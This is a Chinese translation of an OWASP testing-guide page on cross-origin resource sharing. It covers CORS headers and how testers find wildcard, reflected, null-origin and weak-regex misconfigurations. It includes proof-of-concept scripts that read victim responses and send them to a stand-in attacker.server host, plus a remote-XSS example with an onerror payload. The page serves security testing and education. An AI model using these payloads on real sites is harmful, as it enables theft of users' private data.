# 测试跨域资源共享

|ID          |
|------------|
|WSTG-CLNT-07|

## 概述

[跨域资源共享](https://en.wikipedia.org/wiki/Cross-origin_resource_sharing)（CORS）是一种使Web浏览器能够使用XMLHttpRequest（XHR）Level 2（L2）API以受控方式进行跨域请求的机制。过去，XHR L1 API仅允许请求在同一源内发送，因为它受[同源策略](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)（SOP）限制。

跨域请求有一个`Origin`头，标识发起请求的域，并始终发送到服务器。CORS定义Web浏览器和服务器之间使用的协议，以确定是否允许跨域请求。HTTP[头](https://en.wikipedia.org/wiki/Cross-origin_resource_sharing#Headers)用于实现此目的。

[W3C CORS规范](https://www.w3.org/TR/cors/)要求对于非简单请求（如GET或POST以外的请求，或使用凭据的请求），必须提前发送预检OPTIONS请求，以检查请求类型是否会对数据产生不良影响。预检请求检查服务器允许的方法和头，以及是否允许凭据。基于OPTIONS请求的结果，浏览器决定是否允许请求。

### Origin和Access-Control-Allow-Origin

`Origin`请求头始终由浏览器在CORS请求中发送，并指示请求的来源。Origin头不能从JavaScript更改，因为[浏览器（用户代理）阻止其修改](https://developer.mozilla.org/en-US/docs/Glossary/Forbidden_header_name)；但是，依赖此头进行访问控制检查并不是一个好主意，因为它可能在浏览器外被欺骗，例如通过使用代理，因此您仍然需要检查应用程序级协议是否用于保护敏感数据。

`Access-Control-Allow-Origin`是服务器用于指示哪些域允许读取响应的响应头。根据CORS W3规范，由客户端确定并强制执行客户端是否有权访问基于此头的响应数据的限制。

从安全测试的角度来看，您应查找不安全配置，例如使用`*`作为`Access-Control-Allow-Origin`头的值，这意味着允许所有域。另一个不安全的例子是当服务器返回原始头而没有任何额外检查时，这可能导致访问敏感数据。请注意，允许跨域请求的配置非常不安全，通常不可接受，除非是面向公众的API，旨在让每个人访问。

### Access-Control-Request-Method和Access-Control-Allow-Method

`Access-Control-Request-Method`头在浏览器执行预检OPTIONS请求时使用，让客户端指示最终请求的请求方法。另一方面，`Access-Control-Allow-Method`是服务器使用的响应头，描述允许客户端使用的方法。

### Access-Control-Request-Headers和Access-Control-Allow-Headers

这两个头在浏览器和服务器之间使用，以确定哪些头可用于执行跨域请求。

### Access-Control-Allow-Credentials

此响应头允许浏览器在传递凭据时读取响应。当设置此头时，Web应用程序必须将源设置为`Access-Control-Allow-Origin`头的值。`Access-Control-Allow-Credentials`头不能与`Access-Control-Allow-Origin`头一起使用，其值为`*`通配符，如下所示：

```http
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

### 输入验证

XHR L2引入了使用XHR API创建跨域请求的可能性，用于向后兼容。这可能引入XHR L1中不存在的安全漏洞。代码利用的有趣点是将URL传递给XMLHttpRequest而未验证它们，特别是如果允许绝对URL，因为这可能导致代码注入。同样，应用程序的另一部分可能被利用，如果响应数据未转义，我们可以通过提供用户提供的输入来控制它。

### 其他头

还有涉及其他头，如`Access-Control-Max-Age`，决定预检请求可以在浏览器中缓存的时间，或`Access-Control-Expose-Headers`，指示哪些头可以安全地暴露给CORS API的API。

要审查CORS头，请参阅[CORS MDN文档](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#The_HTTP_response_headers)。

## 测试目标

- 识别实施CORS的端点。
- 确保CORS配置安全或无害。

## 如何测试

可以使用[ZAP](https://www.zaproxy.org)等工具来启用测试人员拦截HTTP头，这可以揭示CORS的使用方式。测试人员应特别关注origin头以了解允许哪些域。此外，在某些情况下，需要手动检查JavaScript以确定代码是否因不当处理用户提供的输入而容易受到代码注入。

### CORS错误配置

将通配符设置为`Access-Control-Allow-Origin`头（即`Access-Control-Allow-Origin: *`）是不安全的，如果响应包含敏感信息。虽然它不能与`Access-Control-Allow-Credentials: true`同时使用，但在访问控制仅由防火墙规则或源IP地址（而不是凭据保护）完成的情况下，这可能很危险。

#### 通配符Access-Control-Allow-Origin

测试人员可以检查`Access-Control-Allow-Origin: *`是否存在于HTTP响应消息中。

```http
HTTP/1.1 200 OK
[...]
Access-Control-Allow-Origin: *
Content-Length: 4
Content-Type: application/xml

[Response Body]
```

如果响应包含敏感数据，攻击者可以通过使用XHR来窃取它：

```html
<html>
    <head></head>
    <body>
        <script>
            var xhr = new XMLHttpRequest();
            xhr.onreadystatechange = function() {
                if (this.readyState == 4 && this.status == 200) {
                    var xhr2 = new XMLHttpRequest();
                    // attacker.server: attacker listener to steal response
                    xhr2.open("POST", "https://attacker.server", true);
                    xhr2.send(xhr.responseText);
                }
            };
            // victim.site: vulnerable server with `Access-Control-Allow-Origin: *` header 
            xhr.open("GET", "https://victim.site", true);
            xhr.send();
        </script>
    </body>
</html>
```

#### 动态CORS策略

现代Web应用程序或API可能动态允许跨域请求，通常是为了允许来自子域的请求，如下所示：

```php
if (preg_match('|\.example.com$|', $_SERVER['SERVER_NAME'])) {
   header("Access-Control-Allow-Origin: {$_SERVER['HTTP_ORIGIN']}");
   ...
}
```

在此示例中，将允许来自example.com子域的所有请求。必须确保用于匹配的正则表达式是完整的。否则，如果仅使用`example.com`（没有附加`$`）匹配，攻击者可能通过向`Origin`头附加其域来绕过CORS策略。

```http
GET /test.php HTTP/1.1
Host: example.com
[...]
Origin: https://example.com.attacker.com
Cookie: <session cookie>
```

当发送上述请求时，如果返回的响应中的`Access-Control-Allow-Origin`的值与攻击者的输入相同，攻击者可以读取响应并访问仅可由受害用户访问的敏感信息。

```http
HTTP/1.1 200 OK
[...]
Access-Control-Allow-Origin: https://example.com.attacker.com
Access-Control-Allow-Credentials: true
Content-Length: 4
Content-Type: application/xml

[Response Body]
```

#### 允许的Null Origin值

`Origin`头在特定情况下可能具有`null`值，如由本地文件、重定向或序列化对象触发的请求。开发人员有时允许列表`null`源以方便本地开发或支持非Web客户端。

但是，`null`源作为可利用的"通配符"。攻击者可以通过使用沙盒`iframe`以编程方式生成具有origin `null`的请求。

如果服务器简单地在响应头中反映`null`源，特别是允许凭据，则会创建类似于通用通配符的漏洞。

```http
HTTP/1.1 200 OK
[...]
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
Content-Length: 4
Content-Type: application/xml
```

在利用场景中，攻击者在其恶意站点上嵌入沙盒`iframe`。`sandbox`属性强制浏览器将从该帧内发起的请求的`Origin`设置为`null`。

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,
    <script>
        fetch('https://victim.site/sensitive-data', {
            method: 'GET',
            credentials: 'include' // Essential for sending cookies/auth headers
        })
        .then(response => response.text())
        .then(data => {
            // Exfiltrate data to attacker's server
            location.href = 'https://attacker.server/log?data=' + btoa(data);
        });
    </script>">
</iframe>
```

因此，浏览器看到请求来自`null`，服务器允许`null`，攻击者成功读取了敏感响应。

### 输入验证弱点

CORS概念可以从完全不同的角度看待。攻击者可能故意允许其CORS策略将代码注入目标Web应用程序。

#### 带CORS的远程XSS

此代码向URL中`#`字符后传递的资源发出请求，最初用于从同一服务器获取资源。

易受攻击的代码：

```html
<script>
    var req = new XMLHttpRequest();

    req.onreadystatechange = function() {
        if(req.readyState==4 && req.status==200) {
            document.getElementById("div1").innerHTML=req.responseText;
        }
    }

    var resource = location.hash.substring(1);
    req.open("GET",resource,true);
    req.send();
</script>

<body>
    <div id="div1"></div>
</body>
```

例如，像这样的请求将显示`profile.php`文件的内容：

`https://example.foo/main.php#profile.php`

由`https://example.foo/profile.php`生成的请求和响应：

```html
GET /profile.php HTTP/1.1
Host: example.foo
[...]
Referer: https://example.foo/main.php
Connection: keep-alive

HTTP/1.1 200 OK
[...]
Content-Length: 25
Content-Type: text/html

[Response Body]
```

现在，由于没有URL验证，我们可以注入远程脚本，这将注入并在与`example.foo`域的上下文中执行，URL如下：

```text
https://example.foo/main.php#https://attacker.bar/file.php
```

由`https://attacker.bar/file.php`生成的请求和响应：

```html
GET /file.php HTTP/1.1
Host: attacker.bar
[...]
Referer: https://example.foo/main.php
origin: https://example.foo

HTTP/1.1 200 OK
[...]
Access-Control-Allow-Origin: *
Content-Length: 92
Content-Type: text/html

Injected Content from attacker.bar <img src="#" onerror="alert('Domain: '+document.domain)">
```

## 参考资料

- [OWASP HTML5安全速查表](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#cross-origin-resource-sharing)
- [MDN跨域资源共享](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)
